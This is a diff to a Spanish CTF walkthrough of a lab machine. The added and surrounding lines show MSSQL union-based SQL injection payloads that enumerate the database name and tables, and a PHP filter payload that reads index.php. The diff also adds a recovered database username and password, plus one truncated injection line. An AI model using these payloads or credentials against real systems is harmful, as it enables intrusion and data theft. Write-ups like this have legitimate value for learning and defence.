@@ -136,6 +136,11 @@ Ayudándonos de payloads all the things podemos identificar el nombre de la base
 'union select 1,(SELECT DB_NAME()),3,4,5,6--
 ```
 
+Tambien veremos que usuario somos en la base de datos
+```shell
+'union select 1,
+```
+
 A continuacion buscaremos como listar las tablas
 ```sql
 'union select 1,name,3,4,5,6  from streamio..sysobjects where xtype='U';--
@@ -265,7 +270,14 @@ Obtener el contenido del `index.php`
 php://filter/convert.base64-encode/resource=index.php
 ```
 
-EL contenido obtenido lo decodeamos del base64 en nuestra terminal
+El contenido obtenido lo decodeamos del base64 en nuestra terminal
+Encontrando un usuario y una contraseña
+```ad-hint
+db_admin::B1@hx31234567890
+```
+
+Probaremos a conectarnos a la base de datos a traves de MSSQL
+
 
 
 
